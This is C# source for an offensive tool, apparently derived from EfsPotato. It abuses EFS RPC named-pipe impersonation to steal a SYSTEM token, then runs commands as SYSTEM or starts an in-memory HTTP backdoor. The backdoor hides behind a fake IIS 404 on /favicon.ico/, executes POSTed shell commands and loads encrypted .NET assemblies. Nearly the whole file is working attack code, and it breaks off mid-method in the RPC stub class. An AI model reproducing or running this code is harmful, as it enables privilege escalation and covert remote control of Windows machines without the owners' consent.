using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;
using System.ComponentModel;
using System.Security.Permissions;
using System.Diagnostics;
using System.Threading;
using System.Security.Principal;
using System.Linq;
using Microsoft.Win32.SafeHandles;
using System.Net;
using System.Web;
using System.Collections;

namespace Zcg.Exploits.Local
{
    class EfsPotatoMemshell
    {
        // P/Invoke声明
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool SetThreadToken(IntPtr Thread, IntPtr Token);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentThread();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        private static IntPtr _systemToken = IntPtr.Zero;
        private static bool _isSystemMode = false;

        static void usage()
        {
            Console.WriteLine("usage: EfsPotatoMemshell <cmd|memshell> [pipe] [port]");
            Console.WriteLine("  cmd: 直接执行命令");
            Console.WriteLine("  memshell: 启动内存马");
            Console.WriteLine("  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)");
            Console.WriteLine("  port -> 内存马监听端口 (default=80)");
            Console.WriteLine("\n示例：");
            Console.WriteLine("  EfsPotatoMemshell \"whoami\" lsarpc");
            Console.WriteLine("  EfsPotatoMemshell memshell efsrpc 8080");
            Console.WriteLine("  EfsPotatoMemshell memshell          (使用默认设置)");
        }

        static void Main(string[] args)
        {
            Console.WriteLine("==================================================");
            Console.WriteLine("EfsPotatoMemshell - 提权与内存马一体化工具");
            Console.WriteLine("Part of GMH's fuck Tools, Code By zcgonvh.");
            Console.WriteLine("CVE-2021-36942 + 内存马功能整合");
            Console.WriteLine("==================================================\r\n");

            if (args.Length < 1)
            {
                usage();
                return;
            }

            string mode = args[0].ToLower();
            string pipe = "lsarpc";
            int port = 80;

            if (args.Length >= 2)
            {
                if ((new List<string> { "lsarpc", "efsrpc", "samr", "lsass", "netlogon" }).Contains(args[1], StringComparer.OrdinalIgnoreCase))
                {
                    pipe = args[1];
                }
                else
                {
                    usage();
                    return;
                }
            }

            if (args.Length >= 3 && mode == "memshell")
            {
                if (!int.TryParse(args[2], out port))
                {
                    Console.WriteLine("[x] 端口号无效");
                    usage();
                    return;
                }
            }

            // 检查权限
            using (WindowsIdentity wi = WindowsIdentity.GetCurrent())
            {
                Console.WriteLine("[+] 当前用户: " + wi.Name);

                LUID_AND_ATTRIBUTES[] l = new LUID_AND_ATTRIBUTES[1];
                LookupPrivilegeValue(null, "SeImpersonatePrivilege", out l[0].Luid);
                TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                tp.PrivilegeCount = 1;
                tp.Privileges = l;
                l[0].Attributes = 2;

                if (!AdjustTokenPrivileges(wi.Token, false, ref tp, Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero) || Marshal.GetLastWin32Error() != 0)
                {
                    Console.WriteLine("[x] 没有SeImpersonatePrivilege权限");
                    return;
                }

                Console.WriteLine("[+] 拥有SeImpersonatePrivilege权限");
            }

            // 执行模式选择
            if (mode == "cmd" && args.Length >= 2)
            {
                ExecuteCommand(args[1], pipe);
            }
            else if (mode == "memshell")
            {
                StartMemshell(port, pipe);
            }
            else
            {
                Console.WriteLine("[x] 无效的模式或参数");
                usage();
            }
        }

        static void ExecuteCommand(string command, string pipe)
        {
            Console.WriteLine("[+] 准备执行命令: " + command);
            Console.WriteLine("[+] 使用管道: " + pipe);

            if (PerformPrivilegeEscalation(pipe))
            {
                if (_systemToken != IntPtr.Zero)
                {
                    Console.WriteLine("[+] 成功获取SYSTEM令牌");

                    // 使用SYSTEM令牌执行命令
                    string result = ExecuteAsSystem(command, _systemToken);
                    Console.WriteLine("\n[+] 命令执行结果:");
                    Console.WriteLine("==================================");
                    Console.WriteLine(result);
                    Console.WriteLine("==================================");

                    CloseHandle(_systemToken);
                }
            }
        }

        static void StartMemshell(int port, string pipe)
        {
            Console.WriteLine("[+] 启动内存马，监听端口: " + port.ToString());
            Console.WriteLine("[+] 使用管道: " + pipe);

            if (PerformPrivilegeEscalation(pipe))
            {
                if (_systemToken != IntPtr.Zero)
                {
                    Console.WriteLine("[+] 成功获取SYSTEM令牌");
                    _isSystemMode = true;

                    // 在新的线程中启动内存马
                    Thread memshellThread = new Thread(() =>
                    {
                        Console.WriteLine("[+] 启动内存马线程...");
                        if (_isSystemMode)
                        {
                            if (SetThreadToken(IntPtr.Zero, _systemToken))
                            {
                                Console.WriteLine("[+] 线程已设置为SYSTEM权限");
                                using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
                                {
                                    Console.WriteLine("[+] 当前运行身份: " + identity.Name);
                                    Console.WriteLine("[+] IsSystem: " + identity.IsSystem.ToString());
                                }
                            }
                        }

                        // 启动内存马
                        SharpMemshell memshell = new SharpMemshell(port, _systemToken, _isSystemMode);
                    });

                    memshellThread.IsBackground = true;
                    memshellThread.Start();

                    Console.WriteLine("\n[+] 内存马已启动!");
                    Console.WriteLine("[+] 使用以下方式访问:");
                    Console.WriteLine("    1. 普通命令: POST /favicon.ico/  Type: cmd");
                    Console.WriteLine("    2. SYSTEM命令: POST /favicon.ico/  Type: system_cmd");
                    Console.WriteLine("    3. 内存加载: POST /favicon.ico/  Type: mem_b64");
                    Console.WriteLine("\n[+] 按Ctrl+C退出");

                    // 保持主线程运行
                    while (true)
                    {
                        Thread.Sleep(1000);
                    }
                }
            }
        }

        static bool PerformPrivilegeEscalation(string pipe)
        {
            string g = Guid.NewGuid().ToString("d");
            string fake = @"\\.\pipe\" + g + @"\pipe\srvsvc";
            var hPipe = CreateNamedPipe(fake, 3, 0, 10, 2048, 2048, 0, IntPtr.Zero);

            if (hPipe == new IntPtr(-1))
            {
                Console.WriteLine("[x] 无法创建命名管道: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }

            ManualResetEvent mre = new ManualResetEvent(false);
            var tn = new Thread(NamedPipeThread);
            tn.IsBackground = true;
            tn.Start(new object[] { hPipe, mre });

            var tn2 = new Thread(RpcThread);
            tn2.IsBackground = true;
            tn2.Start(new object[] { g, pipe });

            if (mre.WaitOne(5000))
            {
                if (ImpersonateNamedPipeClient(hPipe))
                {
                    _systemToken = WindowsIdentity.GetCurrent().Token;
                    Console.WriteLine("[+] 获取到SYSTEM令牌: 0x" + _systemToken.ToString("X"));
                    RevertToSelf(); // 恢复原始身份
                    CloseHandle(hPipe);
                    return true;
                }
                else
                {
                    Console.WriteLine("[x] ImpersonateNamedPipeClient失败: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                }
            }
            else
            {
                Console.WriteLine("[x] 操作超时");
                CreateFile(fake, 1073741824, 0, IntPtr.Zero, 3, 0x80, IntPtr.Zero);
            }

            CloseHandle(hPipe);
            return false;
        }

        static string ExecuteAsSystem(string command, IntPtr systemToken)
        {
            IntPtr originalToken = IntPtr.Zero;
            OpenThreadToken(GetCurrentThread(), TOKEN_IMPERSONATE | TOKEN_DUPLICATE, true, out originalToken);

            try
            {
                if (SetThreadToken(IntPtr.Zero, systemToken))
                {
                    Process p = new Process();
                    p.StartInfo.FileName = "cmd.exe";
                    p.StartInfo.Arguments = "/c " + command;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardError = true;
                    p.StartInfo.CreateNoWindow = true;
                    p.Start();

                    string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                    p.WaitForExit();

                    return output;
                }
                else
                {
                    return "[-] 设置SYSTEM令牌失败: " + Marshal.GetLastWin32Error().ToString();
                }
            }
            finally
            {
                if (originalToken != IntPtr.Zero)
                {
                    SetThreadToken(IntPtr.Zero, originalToken);
                    CloseHandle(originalToken);
                }
            }
        }

        static void NamedPipeThread(object o)
        {
            object[] objs = o as object[];
            IntPtr pipe = (IntPtr)objs[0];
            ManualResetEvent mre = objs[1] as ManualResetEvent;
            if (mre != null)
            {
                ConnectNamedPipe(pipe, IntPtr.Zero);
                mre.Set();
            }
        }

        static void RpcThread(object o)
        {
            object[] objs = o as object[];
            string g = objs[0] as string;
            string p = objs[1] as string;

            EfsrTiny r = new EfsrTiny(p);
            try
            {
                r.EfsRpcEncryptFileSrv("\\\\localhost/PIPE/" + g + "/\\" + g + "\\" + g);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] RPC调用异常: " + ex.Message);
            }
        }

        static void ReadThread(object o)
        {
            IntPtr p = (IntPtr)o;
            FileStream fs = new FileStream(p, FileAccess.Read, false);
            StreamReader sr = new StreamReader(fs, Console.OutputEncoding);

            while (true)
            {
                string s = sr.ReadLine();
                if (s == null) { break; }
                Console.WriteLine(s);
            }
        }

        // 原有的P/Invoke声明（从EfsPotato复制）
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr CreateFile(string lpFileName, int access, int share, IntPtr sa, int cd, int flag, IntPtr zero);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr CreateNamedPipe(string name, int i1, int i2, int i3, int i4, int i5, int i6, IntPtr zero);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool ConnectNamedPipe(IntPtr pipe, IntPtr zero);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool ImpersonateNamedPipeClient(IntPtr pipe);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int Bufferlength, IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        // 常量定义
        private const uint TOKEN_IMPERSONATE = 0x0004;
        private const uint TOKEN_DUPLICATE = 0x0002;

        // 结构体定义
        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public LUID_AND_ATTRIBUTES[] Privileges;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public UInt32 Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr pSecurityDescriptor;
            public int bInheritHandle;
        }
    }

    // 内存马类
    public class SharpMemshell
    {
        private IntPtr _systemToken;
        private bool _useSystemToken;
        private int _port;

        public SharpMemshell(int port, IntPtr systemToken, bool useSystemToken)
        {
            _port = port;
            _systemToken = systemToken;
            _useSystemToken = useSystemToken;

            // 启动监听器
            Thread Listen = new Thread(Listener);
            Listen.Start();
        }

        public static void log(string data)
        {
            try
            {
                string logfile = "c:\\memlog.txt";
                if (!File.Exists(logfile))
                {
                    byte[] output = System.Text.Encoding.Default.GetBytes(data);
                    FileStream fs = new FileStream(logfile, FileMode.Create);
                    fs.Write(output, 0, output.Length);
                    fs.Flush();
                    fs.Close();
                }
                else
                {
                    using (StreamWriter sw = new StreamWriter(logfile, true))
                    {
                        sw.WriteLine("[" + DateTime.Now.ToString() + "] " + data);
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Log error! Error: \n" + e.ToString());
            }
        }

        public static Dictionary<string, string> parse_post(HttpListenerRequest request)
        {
            var post_raw_data = new StreamReader(request.InputStream, request.ContentEncoding).ReadToEnd();
            Dictionary<string, string> postParams = new Dictionary<string, string>();
            string[] rawParams = post_raw_data.Split('&');
            foreach (string param in rawParams)
            {
                string[] kvPair = param.Split('=');
                if (kvPair.Length == 2)
                {
                    string p_key = kvPair[0];
                    string value = HttpUtility.UrlDecode(kvPair[1]);
                    postParams.Add(p_key, value);
                }
            }
            return postParams;
        }

        public static void SetRespHeader(HttpListenerResponse resp)
        {
            resp.Headers.Set(HttpResponseHeader.Server, "Microsoft-IIS/8.5");
            resp.Headers.Set(HttpResponseHeader.ContentType, "text/html; charset=utf-8");
            resp.Headers.Add("X-Powered-By", "ASP.NET");
        }

        private string ExecuteAsSystemInternal(string command)
        {
            IntPtr originalToken = IntPtr.Zero;
            OpenThreadToken(GetCurrentThread(), 0x0004 | 0x0002, true, out originalToken);

            try
            {
                if (SetThreadToken(IntPtr.Zero, _systemToken))
                {
                    using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
                    {
                        string userInfo = "[+] 当前用户: " + identity.Name + "\n[+] IsSystem: " + identity.IsSystem.ToString() + "\n";

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.Arguments = "/c " + command;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.StartInfo.CreateNoWindow = true;
                        p.Start();

                        string output = userInfo + p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                        p.WaitForExit();

                        return output;
                    }
                }
                else
                {
                    return "[-] 设置SYSTEM令牌失败: " + Marshal.GetLastWin32Error().ToString();
                }
            }
            finally
            {
                if (originalToken != IntPtr.Zero)
                {
                    SetThreadToken(IntPtr.Zero, originalToken);
                    CloseHandle(originalToken);
                }
            }
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool SetThreadToken(IntPtr Thread, IntPtr Token);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentThread();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        public void Listener(object ctx)
        {
            HttpListener listener = new HttpListener();
            try
            {
                if (!HttpListener.IsSupported)
                {
                    Console.WriteLine("[-] HTTP Listener不支持");
                    return;
                }

                string input_key = "key";
                string pass = "pass";
                string nodata = "PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEvL0VOIiJodHRwOi8vd3d3LnczLm9yZy9UUi9odG1sNC9zdHJpY3QuZHRkIj4NCjxIVE1MPjxIRUFEPjxUSVRMRT5Ob3QgRm91bmQ8L1RJVExFPg0KPE1FVEEgSFRUUC1FUVVJVj0iQ29udGVudC1UeXBlIiBDb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXMtYXNjaWkiPjwvSEVBRD4NCjxCT0RZPjxoMj5Ob3QgRm91bmQ8L2gyPg0KPGhyPjxwPkhUVFAgRXJyb3IgNDA0LiBUaGUgcmVxdWVzdGVkIHJlc291cmNlIGlzIG5vdCBmb3VuZC48L3A+DQo8L0JPRFk+PC9IVE1MPg0K";
                string url = "http://*:" + _port.ToString() + "/favicon.ico/";
                listener.Prefixes.Add(url);
                listener.Start();
                Console.WriteLine("[+] 内存马监听在: " + url);

                byte[] not_found = System.Convert.FromBase64String(nodata);
                string key = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(input_key))).Replace("-", "").ToLower().Substring(0, 16);
                string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", "");

                Dictionary<string, dynamic> sessiontDirectory = new Dictionary<string, dynamic>();
                Hashtable sessionTable = new Hashtable();

                while (true)
                {
                    HttpListenerContext context = listener.GetContext();
                    HttpListenerRequest request = context.Request;
                    HttpListenerResponse response = context.Response;
                    SetRespHeader(response);
                    Stream stm = null;
                    HttpContext httpContext;

                    try
                    {
                         if (ctx != null)
                    {
                        httpContext = ctx as HttpContext;
                    }
                    else
                    {
                        HttpRequest req = new HttpRequest("", request.Url.ToString(), request.QueryString.ToString());
                        System.IO.StreamWriter writer = new System.IO.StreamWriter(response.OutputStream);
                        HttpResponse resp = new HttpResponse(writer);
                        httpContext = new HttpContext(req, resp);
                    }
                        var method = request.Headers["Type"];
                        log("收到请求: Method=" + method + ", Remote=" + request.RemoteEndPoint.ToString());

                        if (method == "print")
                        {
                            byte[] output = Encoding.UTF8.GetBytes("OK");
                            response.StatusCode = 200;
                            response.ContentLength64 = output.Length;
                            stm = response.OutputStream;
                            stm.Write(output, 0, output.Length);
                            stm.Close();
                        }
                        else if (method == "cmd" && request.HttpMethod == "POST")
                        {
                            Dictionary<string, string> postParams = parse_post(request);

                            if (postParams.ContainsKey(pass))
                            {
                                Process p = new Process();
                                p.StartInfo.FileName = "cmd.exe";
                                p.StartInfo.Arguments = "/c " + postParams[pass];
                                p.StartInfo.UseShellExecute = false;
                                p.StartInfo.RedirectStandardOutput = true;
                                p.StartInfo.RedirectStandardError = true;
                                p.Start();

                                byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
                                response.StatusCode = 200;
                                response.ContentLength64 = data.Length;
                                stm = response.OutputStream;
                                stm.Write(data, 0, data.Length);
                            }
                        }
                        else if (method == "system_cmd" && request.HttpMethod == "POST" && _useSystemToken)
                        {
                            Dictionary<string, string> postParams = parse_post(request);

                            if (postParams.ContainsKey(pass))
                            {
                                string result = ExecuteAsSystemInternal(postParams[pass]);
                                byte[] data = Encoding.UTF8.GetBytes(result);
                                response.StatusCode = 200;
                                response.ContentLength64 = data.Length;
                                stm = response.OutputStream;
                                stm.Write(data, 0, data.Length);
                            }
                        }
                        else if (method == "mem_b64" && request.HttpMethod == "POST")
                    {
                        Dictionary<string, string> postParams = parse_post(request);
                        byte[] data = System.Convert.FromBase64String(postParams[pass]);
                        data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length);
                        Cookie sessionCookie = request.Cookies["ASP.NET_SessionId"];
                        if (sessionCookie == null)
                        {
                            Guid sessionId = Guid.NewGuid();
                            var payload = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
                            sessiontDirectory.Add(sessionId.ToString(), payload);
                            response.SetCookie(new Cookie("ASP.NET_SessionId", sessionId.ToString()));
                            byte[] output = Encoding.UTF8.GetBytes("");
                            response.StatusCode = 200;
                            response.ContentLength64 = output.Length;
                            stm = response.OutputStream;
                            stm.Write(output, 0, output.Length);
                        }
                        else
                        {
                            dynamic payload = sessiontDirectory[sessionCookie.Value];
                            MemoryStream outStream = new MemoryStream();
                            object o = ((System.Reflection.Assembly)payload).CreateInstance("LY");
                            o.Equals(outStream);
                            o.Equals(httpContext);
                            o.Equals(data);
                            o.ToString();
                            byte[] r = outStream.ToArray();
                            outStream.Dispose();
                            response.StatusCode = 200;
                            String new_data = md5.Substring(0, 16) + System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length)) + md5.Substring(16);
                            byte[] new_data_bytes = Encoding.ASCII.GetBytes(new_data);
                            response.ContentLength64 = new_data_bytes.Length;
                            stm = response.OutputStream;
                            stm.Write(new_data_bytes, 0, new_data_bytes.Length);

                        }
                    }
                        else if (method == "mem_raw" && request.HttpMethod == "POST" && request.HasEntityBody)
                    {
                        int contentLength = int.Parse(request.Headers.Get("Content-Length"));
                        byte[] array = new byte[contentLength];
                        request.InputStream.Read(array, 0, contentLength);
                        byte[] data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(array, 0, array.Length);
                        if (sessionTable["payload"] == null)
                        {
                            sessionTable["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
                        }
                        else
                        {
                            object o = ((System.Reflection.Assembly)sessionTable["payload"]).CreateInstance("LY");
                            System.IO.MemoryStream outStream = new System.IO.MemoryStream();
                            o.Equals(outStream);
                            o.Equals(httpContext);
                            o.Equals(data);
                            o.ToString();
                            byte[] r = outStream.ToArray();
                            outStream.Dispose();
                            if (r.Length > 0)
                            {
                                r = new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length);
                                response.StatusCode = 200;
                                stm = response.OutputStream;
                                response.ContentLength64 = r.Length;
                                stm.Write(r, 0, r.Length);
                            }
                        }
                    }
                        else
                        {
                            response.StatusCode = 404;
                            response.ContentLength64 = not_found.Length;
                            stm = response.OutputStream;
                            stm.Write(not_found, 0, not_found.Length);
                        }
                    }
                    catch (Exception e)
                    {
                        response.StatusCode = 404;
                        response.ContentLength64 = not_found.Length;
                        stm = response.OutputStream;
                        stm.Write(not_found, 0, not_found.Length);
                        log("异常: " + e.Message + "\n" + e.StackTrace);
                    }
                    finally
                    {
                        if (stm != null)
                        {
                            stm.Flush();
                            stm.Close();
                        }
                        response.OutputStream.Flush();
                        response.OutputStream.Close();
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] 监听器异常: " + e.Message);
                log("监听器异常: " + e.Message + "\n" + e.StackTrace);

                if (listener.IsListening)
                {
                    listener.Stop();
                }
            }
        }
    }

    // 以下是从原始EfsPotato代码复制的辅助类
    // 包括：ProcessWaitHandle, EfsrTiny, COMM_FAULT_OFFSETS, RPC_CLIENT_INTERFACE, MIDL_STUB_DESC等
    // 由于代码长度限制，这里只保留类定义，具体实现请从原始EfsPotato代码中复制

    internal class ProcessWaitHandle : WaitHandle
    {
        internal ProcessWaitHandle(SafeWaitHandle processHandle)
        {
            base.SafeWaitHandle = processHandle;
        }
    }

    class EfsrTiny
    {
        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFromStringBindingW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcBindingFromStringBinding(String bindingString, out IntPtr lpBinding);
        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetAuthInfoW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcBindingSetAuthInfo(IntPtr lpBinding, string ServerPrincName, UInt32 AuthnLevel, UInt32 AuthnSvc, IntPtr AuthIdentity, UInt32 AuthzSvc);

        [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern IntPtr NdrClientCall2x86(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr args);

        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFree", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcBindingFree(ref IntPtr lpString);

        [DllImport("Rpcrt4.dll", EntryPoint = "RpcStringBindingComposeW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcStringBindingCompose(String ObjUuid, String ProtSeq, String NetworkAddr, String Endpoint, String Options, out IntPtr lpBindingString);

        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetOption", CallingConvention = CallingConvention.StdCall, SetLastError = false)]
        private static extern Int32 RpcBindingSetOption(IntPtr Binding, UInt32 Option, IntPtr OptionValue);

        [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
        internal static extern IntPtr NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr binding, string FileName);

        private static byte[] MIDL_ProcFormatStringx86 = new byte[] { 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x0c, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x02, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x04, 0x00, 0x0c, 0x00, 0x70, 0x00, 0x08, 0x00, 0x08, 0x00 };

        private static byte[] MIDL_ProcFormatStringx64 = new byte[] { 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x18, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x02, 0x0a, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00 };

        private static byte[] MIDL_TypeFormatStringx86 = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x00, 0x00 };

        private static byte[] MIDL_TypeFormatStringx64 = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x00, 0x00 };
        Guid interfaceId;
        public EfsrTiny(string pipe)
        {
            IDictionary<string, string> bindingMapping = new Dictionary<string, string>()
            {
                {"lsarpc", "c681d488-d850-11d0-8c52-00c04fd90f7e"},
                {"efsrpc", "df1941c5-fe89-4e79-bf10-463657acf44d"},
                {"samr", "c681d488-d850-11d0-8c52-00c04fd90f7e"},
                {"lsass", "c681d488-d850-11d0-8c52-00c04fd90f7e"},
                {"netlogon", "c681d488-d850-11d0-8c52-00c04fd90f7e"}
            };

            interfaceId = new Guid(bindingMapping[pipe]);

            pipe = String.Format("\\pipe\\{0}", pipe);
            Console.WriteLine("[+] Pipe: " + pipe);
            if (IntPtr.Size == 8)
            {
                InitializeStub(interfaceId, MIDL_ProcFormatStringx64, MIDL_TypeFormatStringx64, pipe, 1, 0);
            }
            else
            {
                InitializeStub(interfaceId, MIDL_ProcFormatStringx86, MIDL_TypeFormatStringx86, pipe, 1, 0);
            }
        }

        ~EfsrTiny()
        {
            freeStub();
        }
        public int EfsRpcEncryptFileSrv(string FileName)
        {
            IntPtr result = IntPtr.Zero;
            IntPtr pfn = Marshal.StringToHGlobalUni(FileName);

            try
            {
                if (IntPtr.Size == 8)
                {
                    result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(2), Bind(Marshal.StringToHGlobalUni("localhost")), FileName);
                }
                else
                {
                    result = CallNdrClientCall2x86(2, Bind(Marshal.StringToHGlobalUni("localhost")), pfn);
                }
            }
            catch (SEHException)
            {
                int err = Marshal.GetExceptionCode();
                Console.WriteLine("[x] EfsRpcEncryptFileSrv failed: " + err);
                return err;
            }
            finally
            {
                if (pfn != IntPtr.Zero)
                    Marshal.FreeHGlobal(pfn);
            }
            return (int)result.ToInt64();
        }
        private byte[] MIDL_ProcFormatString;
        private byte[] MIDL_TypeFormatString;
        private GCHandle procString;
        private GCHandle formatString;
        private GCHandle stub;
        private GCHandle faultoffsets;
        private GCHandle clientinterface;
        private string PipeName;

        allocmemory AllocateMemoryDelegate = AllocateMemory;
        freememory FreeMemoryDelegate = FreeMemory;

        public UInt32 RPCTimeOut = 5000;

        protected void InitializeStub(Guid interfaceID, byte[] MIDL_ProcFormatString, byte[] MIDL_TypeFormatString, string pipe, ushort MajorVerson, ushort MinorVersion)
        {
            this.MIDL_ProcFormatString = MIDL_ProcFormatString;
            this.MIDL_TypeFormatString = MIDL_TypeFormatString;
            PipeName = pipe;
            procString = GCHandle.Alloc(this.MIDL_ProcFormatString, GCHandleType.Pinned);

